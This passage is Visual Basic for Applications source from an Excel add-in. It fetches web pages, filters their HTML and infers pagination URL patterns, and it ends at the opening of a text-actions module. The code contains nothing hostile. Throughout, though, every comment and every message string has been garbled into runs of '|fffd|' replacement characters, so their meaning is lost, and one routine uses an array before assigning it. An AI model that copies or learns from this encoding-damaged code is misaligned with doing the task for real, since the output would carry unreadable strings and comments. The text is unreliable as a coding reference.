    ' |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| - URL, |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    If IsURL(txt$) Then
        msg$ = msg$ & CreateHTMLlink(txt$, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd|-|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|") & "<br />"
        BaseURL$ = txt$
        txt = LoadFromURL_HTML(txt$)
    End If

    If Trim(txt$) = "" Then
        msg$ = msg$ & "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|.<br />"
        GoTo ExitSearchPager
    Else
        msg$ = msg$ & "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd| HTML |fffd||fffd||fffd||fffd|: " & Len(txt) & "<br />"
    End If

    If Filters$ Like "*=*" Then        ' |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| HTML |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|

        txt$ = ApplyHTMLFilters(txt$, Filters$, msg$)
        If Trim(txt$) = "" Then
            msg$ = msg$ & "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| - |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|.<br />"
            GoTo ExitSearchPager
        End If

    ElseIf Filters$ Like "auto" Then        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, - |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|, |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|

        PagerClasses = Array("pager", "pagination", "*pagination", "navigation", "nav", "pagenav", "*navigation*")

        For Each ClassName In PagerClasses
            res$ = GetTags(txt, "any tag", "(class|id)", ClassName, "outerHTML join")
            If res$ Like "*<a*</a>*" Then
                msg$ = msg$ & "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| class|id |fffd|" & ClassName & "|fffd| (" & UBound(arr) + 1 & " |fffd||fffd|.)<br />"
                txt$ = res$: Exit For
            End If
        Next
    End If

    If Not (txt$ Like "*<a*href*#*>*</a>*") Then
        msg$ = msg$ & "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| - |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|.<br />"
        GoTo ExitSearchPager
    End If

    arr = "": arr = Split(GetTags(txt$, "a", "AttributesPattern", "\d", "href_with_prefix"), ARSEP)

    If PagerMask$ = "" Then PagerMask$ = GuessedPagerMask(arr, msg$)
    If PagerMask$ = "" Then
        msg$ = msg$ & "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| - |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|, |fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|.<br />"
        GoTo ExitSearchPager
    End If


    '  TEST_ACTIONS_MODE = True
    Dim PagerMetrics As New Dictionary, param, stp&, Shift&
    PagerMetrics.CompareMode = TextCompare

    For Each param In Split(PagerParameters$, "&")
        If param Like "*?=?*" Then PagerMetrics.item(CStr(Trim(Split(param, "=", 2)(0)))) = Split(param, "=", 2)(1)
    Next
    CalculatePagerMetrics arr, PagerMask$, PagerMetrics, msg$

    With PagerMetrics
        If Val(.item("DeleteBaseURL")) = 0 Then GetPagerLinks = GetPagerLinks & IIf(GetPagerLinks = "", "", ARSEP) & BaseURL$

        If .Exists("shift") Then
            Shift& = Val(.item("shift")): If .item("shift") = "+" Then Shift& = 1 Else If .item("shift") = "-" Then Shift& = -1
        End If

        stp& = Val(.item("step"))
        If stp& <= 0 Then stp& = 1
        For i = Val(.item("min")) To Val(.item("max")) Step stp&
            If Len(.item("prefix")) Then
                URL$ = .item("prefix") & .item("pager") & i + Shift& & .item("suffix")
                'URL$ = .item("prefix") & i + Shift& & .item("suffix")
                GetPagerLinks = GetPagerLinks & IIf(GetPagerLinks = "", "", ARSEP) & URL$
            End If
        Next
    End With

ExitSearchPager:
    If GetPagerLinks = "" Then GetPagerLinks = BaseURL$
    Set PagerMetrics = Nothing
    If Len(msg$) Then If TEST_ACTIONS_MODE Then AddBalloon msg$, bt_Information
End Function

Function CalculatePagerMetrics(ByVal arr, ByVal pager$, ByRef PagerMetrics As Dictionary, Optional ByRef msg$)
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| pager$
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd|

    On Error Resume Next
    Dim pm, pager_prefix$, pager_suffix$, i&, URL$, j&
    '    For Each pm In PagerMetrics.keys
    '        Debug.Print pm, PagerMetrics(CStr(pm))
    '    Next

    While InStr(1, pager$, "##"): pager$ = Replace(pager$, "##", "#"): Wend

    If InStr(1, pager$, "#") Then        ' |fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
        pager_prefix$ = Left(pager$, InStrRev(pager$, "#") - 1)
        pager_suffix$ = Mid(pager$, InStrRev(pager$, "#") + 1)
    Else
        pager_prefix$ = pager$
        pager_suffix$ = ""
    End If

    Dim coll_URL_prefix As New Collection, coll_URL_suffix As New Collection, URLparts As Variant, URLpart_Prefix$, URLpart_Suffix$, BeforeSuffix$
    Dim pager_value_min&, pager_value_max&, coll_pager_values As New Collection, pager_value$, p_val&, p&, p2&
    Const DEFAULT_PAGER_VALUE& = 1000000000#
    pager_value_min& = DEFAULT_PAGER_VALUE&: pager_value_max& = -DEFAULT_PAGER_VALUE&

    For i = LBound(arr) To UBound(arr)
        ' Debug.Print i, arr(i)

        URL$ = arr(i)
        If InStr(1, URL$, pager_prefix$) = 0 Then
            If InStr(1, URL$, Replace(pager_prefix$, "&", "?", , 1)) > 0 Then pager_prefix$ = Replace(pager_prefix$, "&", "?", , 1)
        End If
        PagerMetrics.item("pager") = pager_prefix$

        If InStr(1, URL$, pager_prefix$) Then        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
            URLpart_Prefix$ = "": URLpart_Suffix$ = ""
            URLparts = "": URLparts = Split(URL$, pager_prefix$, IIf(pager_suffix$ <> "", -1, 2), vbTextCompare)

            If UBound(URLparts) = 1 Then    ' |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd|
                URLpart_Prefix$ = URLparts(0)
                URLpart_Suffix$ = URLparts(1)

            Else    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                ' |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd| pager_prefix$ |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd|, |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|
                For p = 1 To UBound(URLparts)
                    If InStr(1, URLparts(p), pager_suffix$) Then
                        BeforeSuffix$ = "": BeforeSuffix$ = Split(URLparts(p), pager_suffix$, 2)(0)
                        If BeforeSuffix$ Like String(Len(BeforeSuffix$), "#") Then
                            ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                            'Debug.Print BeforeSuffix$, "BeforeSuffix$"
                            URLpart_Suffix$ = BeforeSuffix$ & pager_suffix$ & Split(URLparts(p), pager_suffix$, 2)(1)
                            'Debug.Print URLpart_Suffix$, "URLpart_Suffix$"
                            For p2 = p + 1 To UBound(URLparts)
                                URLpart_Suffix$ = URLpart_Suffix$ & pager_prefix$ & URLparts(p2)
                            Next p2

                            URLpart_Prefix$ = ""
                            For p2 = LBound(URLparts) To p - 1
                                URLpart_Prefix$ = URLpart_Prefix$ & IIf(URLpart_Prefix$ = "", "", pager_prefix$) & URLparts(p2)
                            Next p2
                            'URLpart_Prefix$ = URLpart_Prefix$ & pager_prefix$
                            'Debug.Print URLpart_Prefix$ & "===" & URLpart_Suffix$
                            Exit For
                        End If

                        'Debug.Print p, URLparts(p)
                    End If
                Next p
            End If

            If Len(URLpart_Prefix$) Then
                ' URLparts(1) - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd|) + |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|. |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                pager_value$ = ""
                While URLpart_Suffix$ Like "#*"
                    pager_value$ = pager_value$ & Left(URLpart_Suffix$, 1)
                    URLpart_Suffix$ = Mid(URLpart_Suffix$, 2)
                Wend

                coll_URL_prefix.Add URLpart_Prefix$
                coll_URL_suffix.Add URLpart_Suffix$

                If Len(pager_value$) Then
                    p_val& = 0: p_val& = Val(pager_value$)
                    If p_val& > pager_value_max& Then pager_value_max& = p_val&
                    If p_val& < pager_value_min& Then pager_value_min& = p_val&
                    coll_pager_values.Add p_val&
                End If
            End If
        End If
    Next i

    ' |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
    Dim URL_prefix$, URL_suffix$, pager_step&
    URL_prefix$ = MostFrequentlyUsedValue(coll_URL_prefix)
    URL_suffix$ = MostFrequentlyUsedValue(coll_URL_suffix)
    pager_step& = NOD(coll_pager_values)
    'Debug.Print "URL_prefix$", URL_prefix$:    Debug.Print "URL_suffix$", URL_suffix$:    Debug.Print "pager_step&", pager_step&

    Set coll_URL_prefix = Nothing: Set coll_URL_suffix = Nothing: Set coll_pager_values = Nothing

    With PagerMetrics
        If Not .Exists("min") Then .item("min") = IIf(pager_value_min& = DEFAULT_PAGER_VALUE&, 0, pager_value_min&)
        If Not .Exists("max") Then .item("max") = IIf(pager_value_max& = -DEFAULT_PAGER_VALUE&, 0, pager_value_max&)
        If Not .Exists("step") Then .item("step") = IIf(pager_step& > 0, pager_step&, 1)
        If Not .Exists("prefix") Then .item("prefix") = URL_prefix$
        If Not .Exists("suffix") Then .item("suffix") = URL_suffix$
    End With


    '    msg$ = msg$ & "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| - |fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|.<br />"
End Function

Function GuessedPagerMask(ByVal arr, Optional ByRef msg$)
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd| page= |fffd||fffd||fffd| page/
    On Error Resume Next
    Dim i&, j&, Pagers, URL$, freq As New Dictionary, pager$
    Pagers = Array("&page=#", "&offset=#", "&PAGEN_1=#", "&PAGEN_2=#", "&PAGEN_3=#", "&PAGEN_4=#", "&PAGEN_5=#", "&PAGEN_6=#", "&PAGEN_7=#", _
                   "/page/#", "/p#/", "&start=#", "/p/#/", "&p=", "")
    If Not IsArray(arr) Then Exit Function

    For i = LBound(arr) To UBound(arr)
        URL$ = Replace(arr(i), "?", "&")
        For j = LBound(Pagers) To UBound(Pagers)
            pager$ = Pagers(j)
            If Len(pager$) Then
                If URL$ Like "*" & pager$ & "*" Then freq.item(pager$) = Val(freq.item(pager$)) + 1
            End If
        Next j
    Next i

    Dim p, cnt&, max_cnt&, best_mask$
    For Each p In freq.Keys
        cnt& = Val(freq.item(CStr(p)))
        If cnt& > max_cnt& Then max_cnt& = cnt&: best_mask$ = CStr(p)
    Next
    Set freq = Nothing

    If max_cnt& > 0 Then
        msg$ = msg$ & "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| <span style=""color:red;"">" & best_mask$ & _
               "</span> (|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| " & max_cnt& & " |fffd||fffd| " & UBound(arr) + 1 & ").<br />"
        GuessedPagerMask = best_mask$
    Else
        msg$ = msg$ & "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| - |fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|.<br />"
    End If
End Function


Function NOD(ByRef coll As Collection) As Long
    ' https://ExcelVBA.ru/code/GreatestCommonDivisor
    ' |fffd||fffd| |fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd| Excel2007
    Dim i&, G&: On Error Resume Next
    G = coll(1): NOD = G
    If coll.Count = 1 Then Exit Function
    For i = 2 To coll.Count
        G = GCD(IIf(G < coll(i), G, coll(i)), IIf(G < coll(i), coll(i), G))
    Next
    NOD = G
End Function
Function GCD(a As Long, b As Long) As Long        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|
    Dim d&: d = b Mod a: If d = 0 Then GCD = a Else GCD = GCD(d, a)
End Function

Function ApplyHTMLFilters(ByVal txt$, ByVal Filters$, Optional ByRef balloon_msg$, _
                          Optional ByVal ResultType$ = "outerHTML 1") As String
    On Error Resume Next
    Dim res$, AttrName$, AttrValue$, TagName$, filter

    If Trim(ResultType$) = "" Then ResultType$ = "outerHTML 1"
    If InStr(1, ResultType$, " ") = 0 Then ResultType$ = ResultType$ & " 1"

    If Len(Trim(Filters$)) Then        ' |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| HTML |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
        For Each filter In Split(Filters$, "&")
            If Len(Trim(filter)) Then
                If filter Like "*?=?*" Then
                    TagName$ = "any tag"
                    AttrName$ = Trim(Split(filter, "=")(0))
                    AttrValue$ = Trim(Split(filter, "=")(1))
                    If AttrName$ Like "*? ?*" Then
                        TagName$ = Trim(Split(AttrName$, " ")(0))
                        AttrName$ = Trim(Split(AttrName$, " ")(1))
                    End If
                    txt$ = GetTags(txt$, TagName$, AttrName$, AttrValue$, ResultType$)
                    balloon_msg$ = balloon_msg$ & "<strong>|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| HTML |fffd||fffd||fffd||fffd||fffd||fffd|</strong> <span style='color:red;'>" & filter & _
                                   "</span><br />(|fffd||fffd||fffd||fffd||fffd| HTML |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|: " & Len(txt) & ")<br />"
                    If Trim(txt$) = "" Then GoTo ExitApplyFilters
                Else
                    If filter = "ConvertToText" Then
                        txt$ = ConvertHTMLtoText(txt$, True)
                        balloon_msg$ = balloon_msg$ & "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| HTML |fffd| |fffd||fffd||fffd||fffd||fffd|<br />"
                    Else
                        txt$ = GetTags(txt$, filter, , , ResultType$)
                        balloon_msg$ = balloon_msg$ & "<strong>|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| HTML |fffd||fffd||fffd||fffd||fffd||fffd|</strong> <span style='color:red;'>|fffd||fffd| |fffd||fffd||fffd||fffd| " & filter & _
                                       "</span><br />(|fffd||fffd||fffd||fffd||fffd| HTML |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|: " & Len(txt) & ")<br />"
                    End If
                    If Trim(txt$) = "" Then GoTo ExitApplyFilters
                End If
            End If
        Next filter
    End If
ExitApplyFilters:
    ApplyHTMLFilters = txt
End Function

Function MostFrequentlyUsedValue(ByRef coll As Collection) As String
    On Error Resume Next
    Dim v, cnt&, max_cnt&, best_value$, freq As New Dictionary
    freq.CompareMode = TextCompare

    For Each v In coll
        cnt& = Val(freq.item(CStr(v)))
        freq.item(CStr(v)) = cnt& + 1
        If cnt& + 1 > max_cnt& Then max_cnt& = cnt& + 1: best_value$ = CStr(v)
    Next
    Set freq = Nothing
    MostFrequentlyUsedValue = best_value$
End Function
Attribute VB_Name = "mod_AAs_Text"
'---------------------------------------------------------------------------------------
' Module        : mod_AAs_Text                    Version:
' Author        : Igor Vakhnenko                   Date: 14.03.2016
' Professional application development for Microsoft Excel
' https://ExcelVBA.ru/        info@excelvba.ru      Skype: ExcelVBA.ru
'---------------------------------------------------------------------------------------

Option Explicit: Option Compare Text: Option Private Module

Sub InitializeActions_Text(ByRef AAs As ArrayActions)
    On Error Resume Next
    Dim COUNT_ARRAY
    COUNT_ARRAY = Array("1", "2", "3", "4", "5")

    With AAs.AddAction(fc_Text, "Split2", "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (split)", True)
        .Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd|) |fffd||fffd| |fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|)" & vbNewLine & _
                       "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| - |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| 1, |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|-|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|" & vbNewLine & vbNewLine & _
                       "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|1\|fffd||fffd||fffd||fffd||fffd|2\|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|\|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|\|fffd||fffd||fffd||fffd||fffd|3|fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|," & vbNewLine & _
                       "|fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd|\|fffd|, |fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| - |fffd||fffd||fffd||fffd||fffd| 4" & vbNewLine & vbNewLine & _
                       "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|): last (|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|), last-1 (|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|), last-3 (4-|fffd| |fffd| |fffd||fffd||fffd||fffd||fffd|); " & vbNewLine & _
                       "ifexist (|fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|)" & vbNewLine & vbNewLine & _
                       "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| - |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ( |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| | )- |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd|." & vbNewLine & _
                       "|fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|1/2/3|fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd|/|fffd|, |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd|first|second|fffd|, |fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| first " & _
                       "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|1|fffd|, |fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| second |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd|2|fffd|"
